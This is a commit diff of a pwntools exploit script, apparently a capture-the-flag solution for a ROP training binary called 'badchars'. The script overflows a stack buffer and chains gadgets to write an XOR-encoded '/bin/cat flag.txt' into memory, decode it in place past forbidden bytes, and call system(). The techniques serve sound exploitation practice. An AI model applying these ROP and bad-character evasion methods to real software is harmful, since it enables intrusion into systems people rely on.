507e2e696497ec185db5303661320dc9b22609a6
Vincenzo Maffione <v.maffione@gmail.com>
2019-03-28 18:48:23 +0100

    sketch badchars

--- badchars/crack.py
+++ badchars/crack.py
@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('write4')
+exe = context.binary = ELF('badchars')
 context.terminal = "terminator -x".split()
 
 # Many built-in settings can be controlled on the command-line and show up
@@ -26,7 +26,8 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = '''
 break *0x{exe.symbols.pwnme:x}
-break *0x0000000000400805
+break *0x4009b0
+break *0x4009dc
 continue
 '''.format(**locals())
 
@@ -36,17 +37,20 @@ io = start()
 # calls fgets(buf, 50, stdin), although the buffer is only
 # 32 bytes large ...
 
-# Just look at 'objdump -M intel -d ./write4'. In addition to
+# Just look at 'objdump -M intel -d ./badchars'. In addition to
 # the usual main() calling pwnme(), you'll see the usefulGadgets()
-# function containing the gadget "mov [r15], r14; ret", which
-# allows us to write what we want where we want, assuming we
-# are able to load r14 and r15. This is possible with another
-# gadget 'pop r14; pop r15; ret', found with ropper
+# function containing the gadgets
+#    - 'xor [r15],r14b; ret' and 'pop r14; pop r15; ret': XOR a
+#      byte in memory (where we want) with a value at our choice.
+#    - 'mov [r13], r12; ret' and 'pop r12; pop r13; ret': write
+#       arbitrary 8-byte words where we want
+# We can use the -b option of ropper to make sure the gadget themselves
+# do not contain badchars (0x62='b', 0x69='i', etc.):
 #
-#    $ ropper -f write4 --type=rop --search='pop r14'
+#    $ ropper -f badchars --type=rop  -b='6269632f20666e73'
 #
 # The plan is to write a ROP chain that does the following:
-#   - Write "/bin/cat flag.txt" to a fixed address
+#   - Write "/bin/cat flag.txt" (XOR key) to a fixed address
 #   - Load the fixed address into rdi 
 #   - Return to system@plt
 #
@@ -54,7 +58,7 @@ io = start()
 # and we want it to have a fixed address (assuming PIE is disabled).
 # We could look for writable sections using rabin2:
 #
-#    $ rabin2 -S write4
+#    $ rabin2 -S badchars
 #
 # But the problem is that sections may be overlapped, so it's not
 # easy to understand whether a certain range of addresses is actually
@@ -65,28 +69,73 @@ io = start()
 # Wait for the prompt.
 msg = io.recvuntil("> ")
 print(msg)
+
 # Build the input vector as 40 arbitrary bytes plus the ROP chain,
-# that will overwrithe the saved RIP.
+# that will overwrithe the saved RIP. Of course the arbitrary bytes
+# must not contain badchars
 vector = "B" * 40
 
 def append_write(chain, addr, value):
-    # Return address of the gadget "pop r14; pop r15; ret;"
-    chain += p64(0x400890)
-    # The values for r14
-    chain += p64(addr)
-    # The values for r15
+    # Return address of the gadget 'pop r12; pop r13; ret'
+    chain += p64(0x400b3b)
+    # The values for r12
     chain += p64(value)
-    # Return address of the gadget "mov qword ptr [r14], r15; ret;"
-    chain += p64(0x400820)
-
+    # The values for r13
+    chain += p64(addr)
+    # Return address of the gadget 'mov [r13], r12; ret'
+    chain += p64(0x400b34)
     return chain
 
-def write_string(chain, addr, s):
+def append_xor(chain, addr, bytekey):
+    # Return address of the gadget 'pop r14; pop r15; ret'
+    chain += p64(0x400b40)
+    # The values for r14
+    chain += p64(bytekey)
+    # The values for r15
+    chain += p64(addr)
+    # Return address of the gadget 'xor [r15],r14b; ret'
+    chain += p64(0x400b30)
+    return chain
+
+# A function to find a 8-bit XOR key to be applied to a string in
+# order to remove badchars ...
+def find_xor_key(alphabet, badchars):
+    for k in range(1, 256):
+        # Let's try with this key ...
+        encoded = [chr(ord(c) ^ k) for c in alphabet]
+        # Check that the encoding process completely removed
+        # badchars from our alphabet
+        bad = False
+        for e in encoded:
+            if e in badchars:
+                bad = True
+                break
+
+        if not bad:
+            return k
+
+    print("Error: could not find a XOR bytekey")
+    assert(False)
+ 
+def write_string(chain, addr, s, badchars):
+    # Pad the string with zeroes.
     s += '\x00' * (8 - (len(s) % 8))
+
+    # Find a suitable XOR key.
+    bytekey = find_xor_key(s, badchars)
+    print("XOR bytekey found: %s (%s)" % (bytekey, repr(chr(bytekey))))
+
+    # Extend the ROP chain to write the string in memory.
     i = 0
     while i < len(s):
         chain = append_write(chain, addr + i, u64(s[i:i+8]))
         i += 8
+
+    # Extend the ROP chain to decode the string in place.
+    i = 0
+    while i < len(s):
+        chain = append_xor(chain, addr + i, bytekey)
+        i += 1
 
     return chain
 
@@ -98,15 +147,15 @@ def write_string(chain, addr, s):
 # knows why we get a crash).
 dest_addr = 0x601f00
 
-vector = write_string(vector, dest_addr, '/bin/cat flag.txt')
+vector = write_string(vector, dest_addr, '/bin/cat flag.txt', 'bic/ fns')
 
 # Append the address of a 'pop rdi; ret' gadget,
 # and the value of rdi (address of the crafted string).
-vector += p64(0x400893)
+vector += p64(0x400b39)
 vector += p64(dest_addr)
 
-# Return to system@plt (rabin2 -i ./write4)
-vector += p64(0x004005e0)
+# Return to system@plt (rabin2 -i ./badchars)
+vector += p64(0x4006f0)
 
 io.sendline(vector)
 io.interactive()
